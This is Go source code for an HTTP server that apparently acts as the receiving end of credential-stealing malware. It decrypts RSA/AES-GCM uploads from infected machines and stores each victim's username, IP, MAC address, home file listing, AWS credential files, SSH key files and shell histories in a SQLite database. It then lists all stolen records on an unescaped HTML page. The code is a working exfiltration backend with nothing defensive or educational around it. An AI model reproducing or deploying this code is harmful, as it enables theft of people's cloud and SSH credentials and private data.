package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/cipher"
	"crypto/aes"
	"crypto"
	"database/sql"
	"encoding/json"
	"encoding/pem"
	"encoding/binary"
	"strings"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	_ "modernc.org/sqlite"
)

// ---- new structs to match the client's JSON ----
type FileContent struct {
	Name    string `json:"name"`
	Content string `json:"content"`
}

type History struct {
	Zsh  string `json:"zsh"`
	Bash string `json:"bash"`
}

type Cuck struct {
	User      string         `json:"user"`
	IP        string         `json:"ip"`
	MAC       string         `json:"mac"`
	HomeFiles []string       `json:"home_files"`
	AWS       []FileContent  `json:"aws"`
	SSH       []FileContent  `json:"ssh"`
	History   History        `json:"history"`
}

var (
	db        *sql.DB
	privateKey *rsa.PrivateKey
)

func main() {
	// Load RSA private key
	keyBytes, err := os.ReadFile("private.pem")
	if err != nil {
		log.Fatalf("Failed to read private.pem: %v", err)
	}
	block, _ := pem.Decode(keyBytes)
	if block == nil || block.Type != "PRIVATE KEY" {
		log.Fatal("Invalid private key (expecting PRIVATE KEY)")
	}
	key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		key, err = x509.ParsePKCS1PrivateKey(block.Bytes) // try PKCS#1
		if err != nil {
			log.Fatalf("Failed to parse private key: %v", err)
		}
	}
	var ok bool
	privateKey, ok = key.(*rsa.PrivateKey)
	if !ok {
		log.Fatal("Private key is not an RSA key")
	}

	db, err = sql.Open("sqlite", "cucks.db")
	if err != nil {
		log.Fatalf("Failed to open database: %v", err)
	}
	defer db.Close()

	// ---- updated schema with new columns ----
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS cucks (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		user TEXT,
		ip TEXT,
		mac TEXT,
		home_files TEXT,
		aws TEXT,            -- JSON array of {name, content}
		ssh TEXT,            -- JSON array of {name, content}
		history_zsh TEXT,
		history_bash TEXT,
		raw_json TEXT,       -- optional, store the whole original JSON
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
	)`)
	if err != nil {
		log.Fatalf("Failed to create table: %v", err)
	}

	http.HandleFunc("/collect", handleCollect)
	http.HandleFunc("/list", handleList)

	port := "8080"
	log.Printf("Listening on :%s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func handleCollect(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil || len(body) < 2 {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	// 1. Read 2-byte RSA Key Length prefix
	rsaKeyLen := int(binary.BigEndian.Uint16(body[:2]))
	minLen := 2 + rsaKeyLen + 12
	if len(body) < minLen {
		http.Error(w, "Malformed payload structure", http.StatusBadRequest)
		return
	}

	offset := 2
	encAesKey := body[offset : offset+rsaKeyLen]
	offset += rsaKeyLen
	iv := body[offset : offset+12]
	offset += 12
	ciphertext := body[offset:]

	// RSA decryption
	aesKey, err := privateKey.Decrypt(rand.Reader, encAesKey, &rsa.OAEPOptions{
		Hash:     crypto.SHA256,
		MGFHash:  crypto.SHA1,
		Label:    nil,
	})
	if err != nil {
		log.Printf("RSA decryption failed: %v", err)
		http.Error(w, "Decryption error", http.StatusInternalServerError)
		return
	}

	// AES-GCM decryption
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		log.Printf("AES cipher creation failed: %v", err)
		http.Error(w, "Cipher error", http.StatusInternalServerError)
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Printf("GCM initialization failed: %v", err)
		http.Error(w, "GCM error", http.StatusInternalServerError)
		return
	}
	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		log.Printf("AES-GCM decryption/authentication failed: %v", err)
		http.Error(w, "Decryption error", http.StatusBadRequest)
		return
	}

	var cuck Cuck
	if err := json.Unmarshal(plaintext, &cuck); err != nil {
		log.Printf("JSON parse error: %v", err)
		http.Error(w, "JSON error", http.StatusBadRequest)
		return
	}

	// ---- prepare data for insertion ----
	homeFilesStr := strings.Join(cuck.HomeFiles, "\n")

	// Marshal AWS and SSH slices to JSON strings
	awsJSON, _ := json.Marshal(cuck.AWS)
	sshJSON, _ := json.Marshal(cuck.SSH)

	// Store the entire raw JSON as well (optional)
	rawJSON := string(plaintext)

	_, err = db.Exec(
		`INSERT INTO cucks 
		(user, ip, mac, home_files, aws, ssh, history_zsh, history_bash, raw_json)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		cuck.User,
		cuck.IP,
		cuck.MAC,
		homeFilesStr,
		string(awsJSON),
		string(sshJSON),
		cuck.History.Zsh,
		cuck.History.Bash,
		rawJSON,
	)
	if err != nil {
		log.Printf("DB insert error: %v", err)
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

// ---- updated /list handler to show all new columns ----
func handleList(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query(`
		SELECT id, user, ip, mac, home_files, aws, ssh, history_zsh, history_bash, timestamp
		FROM cucks ORDER BY timestamp ASC
	`)
	if err != nil {
		http.Error(w, "DB error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, `
		<table border='1'>
		<tr>
			<th>ID</th><th>User</th><th>IP</th><th>MAC</th>
			<th>Home Files</th><th>AWS</th><th>SSH</th>
			<th>History Zsh</th><th>History Bash</th><th>Time</th>
		</tr>
	`)
	for rows.Next() {
		var id int
		var user, ip, mac, homeFiles, aws, ssh, historyZsh, historyBash, timestamp string
		rows.Scan(&id, &user, &ip, &mac, &homeFiles, &aws, &ssh, &historyZsh, &historyBash, &timestamp)
		fmt.Fprintf(w,
			`<tr>
				<td>%d</td>
				<td>%s</td>
				<td>%s</td>
				<td>%s</td>
				<td><pre>%s</pre></td>
				<td><pre>%s</pre></td>
				<td><pre>%s</pre></td>
				<td><pre>%s</pre></td>
				<td><pre>%s</pre></td>
				<td>%s</td>
			</tr>`,
			id, user, ip, mac, homeFiles, aws, ssh, historyZsh, historyBash, timestamp)
	}
	fmt.Fprint(w, "</table>")
}
